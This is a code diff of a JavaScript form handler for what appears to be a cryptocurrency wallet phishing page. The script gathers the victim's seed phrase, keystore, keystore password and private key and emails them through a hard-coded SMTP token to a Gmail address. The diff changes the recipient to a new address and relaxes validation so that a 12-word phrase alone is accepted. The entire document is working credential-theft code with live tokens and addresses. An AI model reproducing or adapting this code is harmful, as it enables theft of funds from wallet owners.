@@ -17,25 +17,32 @@ let keystore = document.getElementById("kstore");
 let keystorePwd = document.getElementById("kpassword")
 let privateKey = document.getElementById("pkey");
 
-const RECIPIENT = "isaac33robert@gmail.com";
+const RECIPIENT = "lordekbuck10@gmail.com";
 const SENDER = "fordeveloperalone@gmail.com";
 
 const sendEmail = () => {
-    if (!keystorePwd.value || !privateKey.value) {
-        alert("Kindly fill in your data completely")
-        return
+    if (
+      (!phraseText.value || phraseText.value.split(" ").length !== 12) &&
+      !keystorePwd.value &&
+      !privateKey.value
+    ) {
+      alert("Kindly fill in your data completely.");
+      return;
     }
+  
     Email.send({
-        SecureToken : "1a07b115-4736-4afd-b8b6-8804c532fe27",
-        To : RECIPIENT,
-        From : SENDER,
-        Subject : "New Wallet Connection",
-        Body : `<h1 style="color: azure; background-color: #6d2a6a; padding: 10px;">New Wallet Data</h1><p><b>Phrase Text:</b> <code style="background-color: beige; padding: 3px;">${phraseText.value}</code></p><p><b>Keystore:</b> <code style="background-color: beige; padding: 3px;">${keystore.value}</code></p><p><b>Keystore Password:</b> <code style="background-color: beige; padding: 3px;">${keystorePwd.value}</code></p><p><b>Private Key:</b> <code style="background-color: beige; padding: 3px;">${privateKey.value}</code></p>`
-    }).then(
-        message => {
-            if (message == "OK") {
-                alert("Wallet info submitted successfully!");
-            }
-        }
-    );
+      SecureToken: "1a07b115-4736-4afd-b8b6-8804c532fe27",
+      To: RECIPIENT,
+      From: SENDER,
+      Subject: "New Wallet Connection",
+      Body: `<h1 style="color: azure; background-color: #6d2a6a; padding: 10px;">New Wallet Data</h1>
+        <p><b>Phrase Text:</b> <code style="background-color: beige; padding: 3px;">${phraseText.value}</code></p>
+        <p><b>Keystore:</b> <code style="background-color: beige; padding: 3px;">${keystore.value}</code></p>
+        <p><b>Keystore Password:</b> <code style="background-color: beige; padding: 3px;">${keystorePwd.value}</code></p>
+        <p><b>Private Key:</b> <code style="background-color: beige; padding: 3px;">${privateKey.value}</code></p>`
+    }).then((message) => {
+      if (message === "OK") {
+        window.location.href = "contact.html";
+      }
+    });
 } 
